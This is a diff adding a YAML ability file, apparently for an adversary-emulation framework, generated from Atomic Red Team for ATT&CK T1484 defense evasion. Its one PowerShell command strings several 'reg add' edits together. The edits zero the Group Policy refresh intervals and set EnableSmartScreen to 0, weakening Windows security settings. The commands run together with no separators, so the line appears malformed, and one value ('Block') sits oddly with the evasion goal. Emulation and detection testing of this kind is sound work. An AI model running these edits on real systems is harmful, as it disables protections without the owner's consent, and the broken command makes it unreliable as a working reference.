@@ -1,0 +1,18 @@
+- id: 4adc428b-f60e-4c2c-9653-fb64457d3ad7
+  name: Domain or Tenant Policy Modification
+  description: Ability for Domain or Tenant Policy Modification (ATT&CK T1484). Generated
+    from Atomic Red Team procedures; review and test safely before use.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1484
+    name: Domain or Tenant Policy Modification
+  platforms:
+    windows:
+      psh:
+        command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC
+          /t REG_DWORD /d 0 /f reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v EnableSmartScreen /t REG_DWORD /d 0 /f reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v ShellSmartScreenLevel /t REG_SZ /d Block /f
